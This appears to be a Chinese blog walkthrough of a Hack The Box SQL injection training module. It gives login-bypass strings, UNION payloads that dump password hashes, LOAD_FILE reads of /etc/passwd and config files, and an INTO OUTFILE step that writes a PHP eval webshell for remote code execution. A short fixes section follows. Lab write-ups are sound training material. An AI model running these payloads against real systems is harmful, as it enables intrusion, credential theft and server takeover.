---
title: "SQL Injection Fundamentals"
published: 2026-06-16
updated: 2026-06-16
draft: false
description: "mysql -u root -ppassword -h 154.57.164.66 -P 32277 --ssl=0"
image: ""
tags:
  - SQL注入
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

# 使用命令行通过 MySQL 客户端连接到数据库。使用“show databases;”命令列出数据库管理系统 (DBMS) 中的数据库。第一个数据库的名称是什么？

```
mysql -u root -ppassword -h 154.57.164.66 -P 32277 --ssl=0
```

由于一些比较先进的mysql客户端会默认尝试SSL/TLS，但是在这个环境中的数据库服务器不支持，需要`--ssl=0`,有的时候需要`--skip-ssl`,因为不同版本对参数的支持不同

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.310 sec)
```

# “发展”部门的部门编号是多少？

```
use employees;
```

切换到这个数据库

```
show tables;
```

得到

```
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.877 sec)
```

然后

```
MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| d002    | Finance            |
| d003    | Human Resources    |
| d001    | Marketing          |
| d004    | Production         |
| d006    | Quality Management |
| d008    | Research           |
| d007    | Sales              |
+---------+--------------------+
9 rows in set (0.701 sec)
```

# 名字以“Bar”开头，且于1990年1月1日入职的员工的姓氏是什么？

```
MariaDB [employees]> select * from employees where first_name like 'Bar%' order by hire_date DESC;
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
|  10395 | 1960-02-23 | Bartek     | Nastansky | F      | 1989-06-05 |
|  10601 | 1956-08-10 | Barton     | Soicher   | F      | 1986-02-21 |
+--------+------------+------------+-----------+--------+------------+
3 rows in set (0.639 sec)
```

# 在“职称”表中，员工编号大于 10000 或职称不包含“工程师”的记录数是多少？

之前都是翻到输出结果最上面看字段太麻烦了，这次直接使用快捷方式.

```
MariaDB [employees]> select column_name from information_schema.columns where table_name='titles';
+-------------+
| column_name |
+-------------+
| emp_no      |
| title       |
| from_date   |
| to_date     |
+-------------+
4 rows in set (0.407 sec)
```

得到了我们想用的字段，那就直接筛选

```
MariaDB [employees]> select count(*) from titles where emp_no > 10000 and title <>  "Engineer";
+----------+
| count(*) |
+----------+
|      481 |
+----------+
1 row in set (0.916 sec)
```

不对，又看了下发现还有这种职称,类似的职称很多都是带有关键词的，所以重新匹配

```
Assistant Engineer
```

```
MariaDB [employees]> select count(*) from titles where emp_no > 10000 and title <>  "%Engineer";
+----------+
| count(*) |
+----------+
|      654 |
+----------+
1 row in set (0.542 sec)
```

# 尝试以用户“tom”的身份登录。成功登录后，显示的标志值是什么？

万能密码绕过即可,brupsuite抓包放到重放器中，使用以下payload

```
username=tom&password=xxx' or '1'='1
```

即可成功登录，但是登录成功后页面提示我，匪夷所思

```
Login successful as user: admin
```

不对，不对，我特意看了htb的资料，特意提示我and的优先级要比or高那么注入语句是

```
WHERE username='tom'
AND password='xxx'
OR '1'='1'
```
这就导致先计算and，为假，再计算or，false or true = true，这才会导致登录用户为admin

那就用这个payload

```
username=tom' or '1'='1&password=xxx
```

或者

```
username=tom'#
```

应该也是可以的，这个优先级确实一直疏忽了

# 使用 ID 为 5 的用户登录以获取 flag。

这一关提示我们sql语句为

```
WHERE (username='tom' and id > 1)
AND password='xxx'
```

所以payload为

```
username=111' or id=5)-- -&password=111
```

# 使用“mysql”工具连接到上述MySQL服务器，并查找对“employees”表中的所有记录和“departments”表中的所有记录进行“Union”操作时返回的记录数。

既然是联合查询就要看看字段数是否一样

```
MariaDB [employees]> select column_name from information_schema.columns where table_name='employees';
+-------------+
| column_name |
+-------------+
| emp_no      |
| birth_date  |
| first_name  |
| last_name   |
| gender      |
| hire_date   |
+-------------+
6 rows in set (0.512 sec)
```

```
MariaDB [employees]> select column_name from information_schema.columns where table_name='departments';
+-------------+
| column_name |
+-------------+
| dept_no     |
| dept_name   |
+-------------+
2 rows in set (0.301 sec)
```

字段不一样，补全就行

```
MariaDB [employees]> select count(*) from (select * from employees union select dept_no,dept_name,1,2,3,4 from departments) as a;
+----------+
| count(*) |
+----------+
|      663 |
+----------+
1 row in set (0.331 sec)
```

# 使用 Union 注入来获取 'user()' 的结果

判断列的数量

```
http://154.57.164.67:32256/search.php?port_code=1' order by 5-- -
```

判断回显

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,3,4-- -
```

开始注入

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,3,user()-- -
```

# ilfreight 数据库中 users 表中存储的用户 newuser 的密码哈希值是多少？

判断数据库

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,3,database()-- -
```

判断表名

```
http://154.57.164.67:32256/search.php?port_code=1' union select 1,2,group_concat(table_name),database() from information_schema.tables where table_schema=database()-- -
```

判断字段

```
http://154.57.164.67:32256/search.php?port_code=-1' union select 1,2,group_concat(column_name),database() from information_schema.columns where table_name='users'-- -
```

获得密码

```
http://154.57.164.67:32256/search.php?port_code=-1' union select 1,2,3,group_concat(id,0x7e,username,0x7e,password) from users-- -
```

获得

```
1~admin~392037dbba51f692776d6cefb6dd546d,2~newuser~9da2c9bcdf39d8610954e0e11ea8f45f
```

# 从上面的 PHP 代码可以看出，'$conn' 没有定义，因此必须使用 PHP 的 include 命令导入它。检查导入的页面以获取数据库密码。

看了一下应该是使用数据库的DBA权限include一个php文件，补全逻辑释放flag

验证身份

```
http://154.57.164.73:30775/search.php?port_code=1' union select 1,2,user,4 from mysql.user-- -
```

验证权限

```
http://154.57.164.73:30775/search.php?port_code=1' union select 1,2,user,super_priv from mysql.user where user='root'-- -
```

验证具体权限

```
http://154.57.164.73:30775/search.php?port_code=1' union select 1,grantee,privilege_type,4 from information_schema.user_privileges where grantee="'root'@'localhost'"-- -
```

导入原有php页面查看源代码

```
http://154.57.164.73:30775/search.php?port_code=1' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
导入config.php

```
http://154.57.164.73:30775/search.php?port_code=1' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

这样就成功了但是这里这个config是我推测出来的，如果想要得到的话我试试ffuf

```
ffuf -u http://154.57.164.73:30775/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
```

这个也就是config.php文件设置错误导致可以被访问惹的祸

# 

在sql语句中查询secure_file_priv权限，如果这个权限没有启用代表我们有可能可以写入文件

> 利用条件：
> 1. 知道网站在服务器上的绝对路径
> 2. 账户拥有DBA权限，也就是secure_file_priv
> 3. 网站父目录配置允许此路径可以写入文件

```
SHOW VARIABLES LIKE 'secure_file_priv';
```

利用sql注入探查权限

```
http://154.57.164.64:32360/search.php?port_code=1' union select 1,variable_name,variable_value,4 from information_schema.global_variables where variable_name='secure_file_priv'-- -
```

写入文件(这里语法是一样的但是复制错了导致payload有些差异)

```
https://154.57.164.77:31348/index.php?q=1' union select "","","",'<?php @eval($_REQUEST[cmd]);?>' into outfile '/var/www/chattr-prod/shell.php'-- -
```

蚁剑添加连接即可

# sql注入修复方案

预编译

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
```

输入验证

```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
```

以及不要使用管理员权限的用户

参数化查询

```php
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
```

# 技能评估

> htb访问这关的时候需要使用https

### 用户“admin”的密码哈希值是什么？

在登录页面没找到什么突破口但是有一个注册页面需要邀请码,绕过注册码


```
username=hacker&password=Test123%40&repeatPassword=Test123%40&invitationCode=aaaa-bbbb-1234' or '1'='1
```

这一步是在重放里完成的应该是实现了,重新发送显示这个应该没问题

```
HTTP/1.1 500 Internal Server Error
Server: nginx/1.22.1
Date: Tue, 16 Jun 2026 18:38:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 0
```

登录进去后是一个消息平台，有一个search功能，进行测试

```
https://154.57.164.77:31348/index.php?q=1') order by 4-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,4-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='Users'-- -&u=1

https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,group_concat(Username,0x7e,Password) from Users-- -&u=1
```

# Web应用程序的根路径是什么？

使用wappalyzer探测服务器技术发现是nginx中间件，但是需要知道在什么系统上运行，先看看用户是什么

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,user()-- -&u=1
```

显示

```
chattr_dbUser@localhost
```

需要知道这个用户都有哪些权限

```
https://154.57.164.77:31348/index.php?q=1') union select 1,grantee,privilege_type,4 from information_schema.user_privileges where grantee="'chattr_dbUser'@'localhost'"-- -&u=1
```

可以读取文件，探测常用路径

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,load_file('/etc/passwd')-- -&u=1
```

输出成功是Linux系统，先看看secure_file_priv权限能不能支持待会传马，可以

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,variable_name,variable_value from information_schema.global_variables where variable_name='secure_file_priv'-- -&u=1
```


那就排查nginx中间件，一般位置在/etc/nginx/nginx.conf文件有配置信息

```
 include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*
```

既然这样就需要排查sites-enabled目录下的文件，利用brupsuite攻击模块爆破即可

```
default
```
读取

```
https://154.57.164.77:31348/index.php?q=1') union select 1,2,3,load_file('/etc/nginx/sites-enabled/default')-- -&u=1
```

得到

```
/var/www/chattr-prod
```

# 实现远程代码执行，并将 /flag_XXXXXX.txt 的内容提交如下。

既然知道绝对路径就可以尝试写入webshell

```
https://154.57.164.77:31348/index.php?q=1') union select "","","",'<?php @eval($_REQUEST[cmd]);?>' into outfile '/var/www/chattr-prod/shell.php'-- -&u=1
```

连接蚁剑即可
